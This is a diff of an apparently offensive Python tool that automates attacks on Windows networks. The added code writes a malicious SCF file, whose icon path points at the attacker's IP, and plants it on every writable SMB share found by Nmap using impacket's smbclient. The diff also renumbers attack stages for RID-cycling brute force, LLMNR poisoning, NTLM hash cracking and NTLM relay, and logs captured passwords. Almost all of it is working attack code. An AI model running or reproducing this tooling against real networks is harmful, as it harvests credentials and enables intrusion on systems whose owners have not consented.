@@ -83,9 +83,9 @@ def nmap_status_printer(nmap_proc):
     Prints that Nmap is running
     '''
     i = -1
+    x = -.5
     while nmap_proc.is_running():
         i += 1
-        x = -.5
         # Every 30 seconds print that Nmap is still running
         if i % 30 == 0:
             x += .5
@@ -94,16 +94,66 @@ def nmap_status_printer(nmap_proc):
 
 def create_scf():
     '''
-    Creates scf file
+    Creates scf file and smbclient.py commands file
     '''
-    scf_data = '[Shell]\nCommand=2\nIconFile=\\\\{}\\file.ico\n[Taskbar]\nCommand=ToggleDesktop'.format(get_ip())
-    with open('submodules/@local.scf', 'w') as f:
-        f.write(scf_data)
+    scf_filename = '@local.scf'
 
-def parse_nse(host):
+    if not os.path.isfile(scf_filename):
+        scf_data = '[Shell]\nCommand=2\nIconFile=\\\\{}\\file.ico\n[Taskbar]\nCommand=ToggleDesktop'.format(get_ip())
+        write_to_file(scf_filename, scf_data, 'w+')
+
+    cwd = os.getcwd()+'/'
+    scf_filepath = cwd+scf_filename
+
+    return scf_filepath
+
+def run_smbclient(server, share_name, action, scf_filepath):
+    '''
+    Run's impacket's smbclient.py for scf file attack
+    '''
+    smb_cmds_filename = 'smb-cmds.txt'
+    smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
+    write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
+    smbclient_cmd = 'python2 submodules/impacket/examples/smbclient.py {} -f {}'.format(server, smb_cmds_filename)
+    stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
+    return stdout, stderr
+
+def get_share(l, share):
+    '''
+    Gets the share from Nmap output line
+    e.g., \\\\192.168.1.10\\Pictures
+    '''
+    if l.startswith('  \\\\') and '$' not in l:
+        share = l.strip()[:-1]
+    return share
+
+def write_scf_files(lines, share, ip):
+    '''
+    Writes SCF files to writeable shares based on Nmap smb-enum-shares output
+    '''
+    for l in lines:
+        share = get_share(l, share)
+        if share:
+            share_folder = share.split('\\')[-1]
+            if 'Anonymous access:' in l or 'Current user access:' in l:
+                access = l.split()[-1]
+                if access == 'READ/WRITE':
+                    scf_filepath = create_scf()
+                    print('[+] Writeable share found at: '+share)
+                    print('[*] Attempting to write SCF file to share')
+                    action = 'put'
+                    stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
+                    if os.path.basename(scf_filepath) in str(stdout):
+                        print('[+] Successfully wrote SCF file to: {}'.format(share))
+                        write_to_file('logs/Shares-with-SCF.txt', share+'\n', 'a+')
+
+def parse_nse(host, ip):
+    '''
+    Parse NSE script output
+    '''
+    share = None
     sec_run = False
     enum_run = False
-    share_found = False
     smb_signing_disabled_hosts = []
 
     # Get SMB signing data
@@ -117,41 +167,25 @@ def parse_nse(host):
         # Write an scf file to it
         if script_out['id'] == 'smb-enum-shares':
             enum_run = True
-            lines = script_out['output']
-            share_found = False
+            lines = script_out['output'].splitlines()
+            write_scf_files(lines, share, ip)
 
-            for l in lines:
-                if share_found == True:
-                    if 'Path: ' in line:
-                        path = line.split()[-1]
-                    if 'Anonymous access:' in line:
-                        create_scf()
-                        share_found = False
-                        access = l.split()[-1]
-                        if access == 'READ/WRITE':
-                            print('[+] Writable share found at: '+share)
-                            print('[*] Attempting to write SCF file to share')
-                            scf_file = open('submodules/@local.scf', 'rb')
-                            filename = '@local.scf'
-                            try:
-                                conn = SMBConnection('','','icebreaker','remote', is_direct_tcp=True)
-                                conn.connect(server, 445)
-                                shares = conn.listShares()
-                                for s in shares:
-                                    if s.name == share_name:
-                                        filesize = conn.storeFile(share_name, path+'\\'+filename, scf_file)  
-                                        print('[+] Uploaded {} bytes to {}'.format(filesize, share))
-                            except:
-                                print('[-] Failed to upload SCF file')
-                if l.startswith('  \\\\'):# and '$' not in l:  1111111111111
-                    share_found = True
-                    # remove semicolon at end of line
-                    share = l.strip()[:-1]
-                    server = share.split('\\')[2]
-                    share_name = share.split('\\')[2]
+    local_scf_cleanup()
 
     return sec_run, enum_run, smb_signing_disabled_hosts
 
+def local_scf_cleanup():
+    '''
+    Removes local SCF file and SMB commands file
+    '''
+    try:
+        os.remove('@local.scf')
+    except:
+        pass
+    try:
+        os.remove('smb-cmds.txt')
+    except:
+        pass
 
 def get_hosts(args, report):
     '''
@@ -170,13 +204,14 @@ def get_hosts(args, report):
                     if s.state == 'open':
                         ip = host.address
                         hosts.append(ip)
-                        sec_run, enum_run, smb_signing_disabled_hosts = parse_nse(host)
+
+                        sec_run, enum_run, smb_signing_disabled_hosts = parse_nse(host, ip)
 
     # If nmap user ran didn't do smb-security-mode script, do it now
     if args.xml:
         if len(hosts) > 0:
             if sec_run == False or enum_run == False:
-                print("[*] One or more NSE scripts (smb-security-mode and smb-enum-shares) were not run in your Nmap scan. Running them now")
+                print("[*] Running missing NSE scripts")
                 report = nmap_scan(hosts)
                 hosts, smb_signing_disabled_hosts = get_hosts(args, report)
 
@@ -184,7 +219,7 @@ def get_hosts(args, report):
         print('[-] No hosts were found with port 445 open')
     else:
         for h in hosts:
-            print('[+] SMB open: {}'.format(ip))
+            print('[+] SMB open: {}'.format(h))
 
     return hosts, smb_signing_disabled_hosts
 
@@ -294,8 +329,11 @@ def get_usernames(ridenum_output):
 
     return ip_users
 
-def write_to_file(filename, data):
-    with open(filename, 'a+') as f:
+def write_to_file(filename, data, write_type):
+    '''
+    Write data to disk
+    '''
+    with open(filename, write_type) as f:
         f.write(data)
 
 def create_brute_cmds(ip_users, passwords):
@@ -452,7 +490,7 @@ def log_pwds(users_pws):
         ip = k
         for user_pw in users_pws[k]:
             line = '{}: {}\n'.format(ip, user_pw)
-            write_to_file('found-passwords.txt', line)
+            write_to_file('found-passwords.txt', line, 'a+')
 
 def edit_responder_conf(switch, protocols):
     '''
@@ -576,7 +614,7 @@ def crack_hashes(hashes, identifier):
         for hash_type in hashes:
             filename = '{}-hashes-{}.txt'.format(hash_type, identifier)
             for h in hashes[hash_type]:
-                write_to_file(filename, h)
+                write_to_file(filename, h, 'a+')
             if 'v1' in hash_type:
                 hash_format = 'netntlm'
             elif 'v2' in hash_type:
@@ -806,9 +844,10 @@ def do_ntlmrelay(identifier, prev_hashes, prev_pwds):
     '''
     Continuously monitor and parse ntlmrelay output
     '''
-    print('[*] Attack 3: NTLM relay')
+    print('[*] Attack 4: NTLM relay')
     resp_proc, ntlmrelay_proc = run_relay_attack()
 
+    ########## CTRL-C HANDLER ##############################
     def signal_handler(signal, frame):
         '''
         Catch CTRL-C and kill procs
@@ -836,9 +875,8 @@ def do_ntlmrelay(identifier, prev_hashes, prev_pwds):
                     v2_file.write(infile2.read())
                     os.rename(fname, 'logs/'+fname)
         sys.exit()
-
-    # CTRL-C handler
     signal.signal(signal.SIGINT, signal_handler)
+    ########## CTRL-C HANDLER ##############################
 
     mimi_data = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
     print('[*] ntlmrelayx.py output:')
@@ -867,20 +905,20 @@ def main(report, args):
     hosts, smb_signing_disabled_hosts = get_hosts(args, report)
     if len(hosts) > 0:
         for host in smb_signing_disabled_hosts:
-            write_to_file('smb-signing-disabled-hosts.txt', host+'\n')
+            write_to_file('smb-signing-disabled-hosts.txt', host+'\n', 'w+')
 
-        # ATTACK 1: RID Cycling into reverse bruteforce
-        if 'ridenum' not in args.skip.lower():
-            print('[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
+        # ATTACK 2: RID Cycling into reverse bruteforce
+        if 'rid' not in args.skip.lower():
+            print('[*] Attack 2: RID cycling in null SMB sessions into reverse bruteforce')
             users_pws = smb_reverse_brute(loop, hosts, args)
             if users_pws != None:
                 log_pwds(users_pws)
 
 
-    # ATTACK 2: LLMNR poisoning
+    # ATTACK 3: LLMNR poisoning
     identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))
-    if 'responder' not in args.skip.lower():
-        print('[*] Attack 2: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
+    if 'llmnr' not in args.skip.lower():
+        print('[*] Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
         prev_lines = []
         resp_proc = start_responder_llmnr()
         time.sleep(2)
@@ -898,7 +936,7 @@ def main(report, args):
             # Give responder some time to die with dignity
             time.sleep(2)
 
-    # ATTACK 3: NTLM relay
+    # ATTACK 4: NTLM relay
     if 'relay' not in args.skip.lower() and len(hosts) > 0:
         do_ntlmrelay(identifier, prev_hashes, prev_pwds)
     elif len(hosts) == 0:
